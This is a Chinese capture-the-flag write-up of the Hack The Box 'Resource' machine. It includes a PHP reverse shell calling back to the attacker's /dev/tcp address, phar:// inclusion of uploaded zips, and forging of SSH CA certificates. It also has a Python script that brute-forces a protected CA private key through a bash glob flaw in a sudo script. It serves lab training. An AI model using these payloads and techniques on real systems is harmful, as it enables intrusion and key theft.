#  HTB靶场 Resource (Linux)[Medium]   
原创 Rsec  Rsec   2024-08-15 16:39  
  
**本文章仅用于网络安全研究学习，请勿使用相关技术进行违法犯罪活动。**  
  
**Hack The Box是一个国外的靶机在线平台（官方网址：https://www.hackthebox.eu/），实验环境将实时更新,允许您测试您的****渗透测试****技能。**  
  
**知识点：php伪协议、SSH CA签名登录。**  
  
     
  
**Kali：10.10.16.39**  
  
**靶场：10.10.11.27**  
  
             
  
0000.靶场基本情况  
  
使用namp扫描，开放端口有22、80、2222。  
  
22和2222端口都是ssh服务。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKt63ib6uGxicOg1wEVJvPEbUz3wMfI3Z6GYespSuiaLPWYEf7xOK1apl69g/640?wx_fmt=png "")  
  
            
  
访问**10.10.11.27**，自动跳转**http://itrc.ssg.htb**，配置host或者dns就可以正常访问，主页如下：      
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtUrsHldGlsbmLX7n47fttbX1eQHgnQDz87nqZAlqLRWkXmmHvJR5QUg/640?wx_fmt=png "")  
  
             
  
注册用户**test_1**，登录后进入个人页面，在这个页面可以给管理员留言。  
  
注意url格式为?page=dashboard，可能有文件包含漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtqgXHM4qiaAeIds4Ilg0ySx5XGquNdg3icGbZGVnPCAJvHTVyibbiauF6Iw/640?wx_fmt=png "")  
  
                 
  
创建Ticket，可以上传zip文件，经过测试只能上传zip文件，可以读取到上传后的位置。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtibrokQLXeficl74U01KjjNibC87tSQgsjCQVeUbuKUQ3PI2uR639TcogA/640?wx_fmt=png "")  
  
             
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtgdpI4UPEgX01Q1vFTAsicdgtPshBYgubh7Q9KrXII8Qsv37BNmSkWAQ/640?wx_fmt=png "")  
  
                 
  
对目录进行扫描，发现**?page=admin**界面可以越权访问。**admin**界面有**ping**功能，测试命令注入无果。  
  
历史Ticket ID从1到8,但是都无法访问。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKt1LdfCb7p6RGtK2fMlYzTHe7hebfgibjG9UmiaCxHzHoaJa5PYbt6GZsg/640?wx_fmt=png "")  
  
             
  
**0001.php伪协议获取www-date用户权限**  
  
创建ticket，在zip文件里面包含phpinfo.php文件。  
  
访问如下命令，可以直接执行php代码。  
```
?page=phar://uploads/0000af8b7fb5d897811078a2ded3ace98479cea3.zip/phpinfo
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKticpB4gf2ic4QyeJAAMPK3t1jmtaybVHgS0lhkaKeSeq0YZmibdMtIPezQ/640?wx_fmt=png "")  
  
             
  
在kali监听4445端口  
```
nc -lnvp 4445
```  
  
   
  
上传反弹shell文件  
```
<?php eval(system("bash -c 'bash -i >& /dev/tcp/10.10.16.39/4445 0>&1'")); ?>
```  
  
            
  
成功反弹**shell**，获取**www-data**权限。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtRgW3GPRCuOicFUUaIAQTIY9KnTP6mibf3mPLEo49PEsMWvkGoVFH85RA/640?wx_fmt=png "")  
  
             
  
**0002.获取msainristil权限**      
  
在**/home**目录下发现两个用户**msainristil**和**zzinter**，我们的**目标是获取这两个用户或root的权限。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtE3B1fDVjjyq0G0pygRRtldDe8ZK9skEgMIA8Mhiaa67uicfdrfztNcoQ/640?wx_fmt=png "")  
  
             
  
在**/var/www/itrc/db.php**文件下发现mysql的用户名密码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtBbFHUp0ckiaPYrSib67RrLeckqkIHBQwiargocrf0wAlkMoQbgyb4CZ0g/640?wx_fmt=png "")  
  
  
连接mysql需要交互式shell，当前环境没有python，无法使用python改变交互模式，所以进入mysql需要借助socat。    
  
连接mysql时主机要指定db。  
```
mysql -h db -u jj -p
```  
  
mysql获取的用户密码无法解密。mysql对解题无帮助，这里就略写。  
  
ping db，发现ip地址为172.233.0.2。  
  
当前环境无法使用ifconfig，借助工具发现当前环境ip为172.233.0.3，且在  
根目录发现.dockerenv文件，确定当前环境为docker内部  
。      
  
22端口的ssh是docker内部的服务，2222端口的ssh应该是主机的服务。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtFo0oPVO2AqYLWjFgTNUCtzPKaoTIqgTFpQ8yJNDxWt9RS4xtDUlxZw/640?wx_fmt=png "")  
  
             
  
**/var/www/html/uploads/c2f48xxxx.zip**  
文件中有个文件**itrc.ssg.htb.har**，在里面找到**msainristil**用户的密码。  
```
unzip c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
cat itrc.ssg.htb.har | grep msainristil
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKt7A2R5Oaedn6QHwMtiaXG2CicnCAXibvNicicoQs2yrV9xmtDWVrE3klL2VA/640?wx_fmt=png "")  
  
             
  
**ssh**  
登录**msainristil**用户。  
```
ssh msainristil@ssg.htb
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtbAxqQTaFWm9MLTLJQhcTYPm6FPXwJCWnhib6A2jSCyDnJiaoQZVGeDicg/640?wx_fmt=png "")  
  
             
  
**0003.Docker中zzinter用户权限**      
  
在**msainristil**  
用户目录下**decommission_old_ca**文件夹，里面有两个文件**ca-itrc**和**ca-itrc.pub**。这里需要自己创建密钥，然后使用ca签名就可以登录了。  
  
不了解的可以参考这篇文章：  
> ssh使用CA签名登录  
  
> https://www.cnblogs.com/osnosn/p/16870594.html  
  
  
        
  
使用下列命令生成私钥**users_key**和公钥**users_key.pub**  
```
ssh-keygen -t rsa -C zzinter@ssg.htb -f users_key
```  
  
        
  
使用下列命令进行签名，得到**user_key-cert.pub**文件。  
```
ssh-keygen -s ca-itrc -n zzinter -I ident users_key.pub
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtthGLYzh4H5soYLAlJff3k3EnDGCDpOX5UnrZu5GeF7T9ECvCyOCjmA/640?wx_fmt=png "")  
  
  
使用下列命令将文件传回kali。  
```
scp msainristil@ssg.htb:/home/msainristil/decommission_old_ca/user* .
```  
  
         
  
使用ssh登录zzinter  
```
ssh -i users_key zzinter@ssg.htb
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtGDIOUaateyAslrYJvA2thjZ7xTcuvb3AFyf5uIBDWALeUX2M9ksVfQ/640?wx_fmt=png "")  
  
             
  
**0004.获取docker的root权限**  
  
使用上诉方法  
  
**靶机：**  
```
ssh-keygen -t rsa -C root@ssg.htb -f dockerroot
ssh-keygen -s ca-itrc -n root -I ident dockerroot.pub
```  
  
        
  
**kali中：**  
```
scp msainristil@ssg.htb:/home/msainristil/decommission_old_ca/dockerroot* .
ssh -i dockerroot root@ssg.htb
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtYZBde2nwVtEqU4hRg1ZO6Pv3Snheib1xTHkOdqwXeXN7rhibbcVHtgrw/640?wx_fmt=png "")  
  
                 
  
**0005.获取主机的support用户权限**  
  
在**zzinter**用户找到发现**user.txt**。  
  
其中还有**sign_key_api.sh**文件，打开后代码如下  
```
#!/bin/bash

usage () {
    echo "Usage: $0"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then    
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```  
  
    
         
  
代码运行需要3个参数**public_key_file**、**username**、 **principal**。  
  
public_key_file  
是上面我们自己生成的密钥对中的公钥。  
  
username  
：和principal保持一致就可以。  
       
  
principal  
是对私钥签名后文件中的一个字段，指示的是登录名，以前文**users_key-cert.pub**为例，可以看到  
principal  
的值是  
zzinter  
。  
```
ssh-keygen -L -f users_key-cert.pub
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtmhnjluN6rzwp7YJHiaDlCpvQiaGocOdJxw2LT7uWblcyVRrEibvNamMnQ/640?wx_fmt=png "")  
  
             
  
代码还对**principal**进行了限制，只能**webserver,analytics,support,security**是四个字段之一。  
看似限制，实则提醒。  
        
  
我们在前面使用如下命令进行签名，该代码的功能一样，只是签名文件由服务器提供。      
```
ssh-keygen -s ca-itrc -n zzinter -I ident users_key.pub      
```  
  
  
经过测试使用如下面命令和用户获取**support**的私钥文件。  
  
**靶机中：**  
```
ssh-keygen -t rsa -C support@ssg.htb -f support
./sign_key_api.sh support.pub support support > support-cert.pub
mv supp* /tmp
chmod 777 /tmp/supp*
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtdHqPGNX2sBbHOJ8uPvqpQX2KlXliaJCPxlVqmAPMJ5epJRBCxibMDq8A/640?wx_fmt=png "")  
  
             
  
**Kali中：**  
```
scp msainristil@ssg.htb:/tmp/suppo* .
chmod 700 support*
ssh -i support -p 2222 support@ssg.htb
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtpHpBEN8ibVj2dH5yw6aia3cwUECGYmckicZ4qsyxXSYnkQ14eXv0TawqA/640?wx_fmt=png "")  
  
                 
  
**0006.zzinter权限**  
  
在**/etc/ssh/auth_principals**文件夹中，可以知道**zzinter**用户可以使用**zzinter_temp ca**登录。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtrPvMkfX7NNhPbrmz4WOI7ywO9oyEkR3Fmwszfh0xPQOr2TAlxkHgyg/640?wx_fmt=png "")  
  
             
  
使用上面的方法，本来是想直接使用curl请求，但是我无论怎么尝试**curl**请求都是返回错误。  
        
  
在靶机中：  
  
将**/home/zzinter/sign_key_api.sh**复制到**/tmp/sign.sh**  
```
cp /home/zzinter/sign_key_api.sh /tmp/sign.sh         
```  
  
  
修改sign.sh，在限制的字段中加入zzinter_temp  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtHUf6NIUYQCU6pS64894nlq1WMf4A88ljCm0zPvAPEqjQIofHuzCpng/640?wx_fmt=png "")  
  
  
在靶机中执行如下命令  
```
ssh-keygen -t rsa -C zzinter@ssg.htb -f zzintertemp    
./sign.sh zzintertemp.pub zzinter zzinter_temp > zzintertemp-cert.pub
chmod 777 /tmp/zzintertemp*
```  
  
          
  
**kali中：**  
```
scp msainristil@ssg.htb:/tmp/zzintertemp* .
chmod 700 zzintertemp*
ssh -i zzintertemp -p 2222 zzinter@ssg.htb
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtoexPoERVq9EDdB8q8eEFvRiaU6sFDIFdZLWIn5heEKbodrds1f8D8Kw/640?wx_fmt=png "")  
  
             
  
**0007.root权限**  
  
通过查找，在**/opt**文件夹下找到**sign_key.sh**文件。  
  
使用**sudo -l**可以发现**zzinter**用户不需要密码就可以执行**sign_key.sh。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtoKrFUTRBsqkicicbvDXnaTRAjMicPiaf8icPRBpfZtzic8DUoNKt2sgX2jQg/640?wx_fmt=png "")  
  
             
  
sign_key代码如下：  
```
#!/bin/bash

usage () {
    echo "Usage: $0"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

if [[ $ca == "/etc/ssh/ca-it" ]]; then    
    echo "Error: Use API for signing with this CA."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"    
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"
```  
  
  
先看代码最后一句，就是我们签名使用签名文件对公钥进行签名的操作。  
```
ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"
```  
  
-s：签名文件  
  
-z：序列号      
  
-I：官方解释是身份标识，填用户名应该就可以  
  
-V：时效多长  
  
-n: 登录别名，类似**zzinter_temp**，这里要求**root**，应该使用**root_user**。  
  
             
  
代码中对签名文件进行了限制，不允许是/etc/ssh/ca-it文件。还是那句话，**看似限制，实则提醒**。  
  
当前用户对/etc/ssh/ca-it没有访问权限，  
这里要使用Bash通配符滥用。  
  
简述：文件a内容为abcd,我们使用文件b与文件a比对，如果内容一样则提示。  
通配符滥用就是，当文件b的内容为a*时，也会提示。  
  
  
**靶机中：**  
  
在**/tmp**文件夹新建**test-ca**文件，创建密钥对：  
```
ssh-keygen -t rsa -C root@ssg.htb -f rootuser
```  
  
         
  
新建**qcat.py**文件，写入如下代码并执行：  
```
import os

header = "-----BEGIN OPENSSH PRIVATE KEY-----"
footer = "-----END OPENSSH PRIVATE KEY-----"
ba64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="    
key = []
line= 0

while True:
    for char in ba64chars:
        testKey = header + "\n" + "".join(key) + char + "*"
        with open('/tmp/test-ca', 'w', encoding='utf-8') as f:
            f.write(testKey)
        orderResult = os.popen("sudo /opt/sign_key.sh /tmp/test-ca rootuser.pub root root_user 05").readlines()

        if "Error: Use API for signing with this CA." in str(orderResult):
            key.append(char)
            if len(key) > 0 and (len(key) - line) % 70 == 0:
                line = line + 1
                key.append("\n")
            break
    else:
        break

testKey = header + "\n" + "".join(key) + “\n” + footer
with open('/tmp/test-ca','w') as f:
    f.write(testKey)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKtC0Q4bPicU9NZraPjyUvbMIymfX0Q0ibkJMrSLN3stY3gdPVicRmkONNaQ/640?wx_fmt=png "")  
  
      
  
已经获取**ca-it**，使用**ca**对密钥对进行签名，获取**rootuser-cert.pub**文件。  
```
sudo /opt/sign_key.sh /tmp/test-ca rootuser.pub root root_user 05
```  
  
        
  
传输回本地，这里直接使用python建立http服务：  
```
python -m http.server 8001
```  
  
         
  
**kali：**  
```
wget http://10.10.11.27:8001/rootuser-cert.pub
wget http://10.10.11.27:8001/rootuser
wget http://10.10.11.27:8001/rootuser.pub

ssh -i rootuser -p 2222 root@ssg.htb
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs9ichfplmKEJNch7DHYwuBnKt6IgAunpKN8WkEMfW9or8UmI5Wty8l4gAvdF2wDcpQrRY8nIeqJdZ0A/640?wx_fmt=png "")  
  
             
  
在**/root**找到最后一个**root.txt**。      
  
  
**感谢观看！**  
  
  
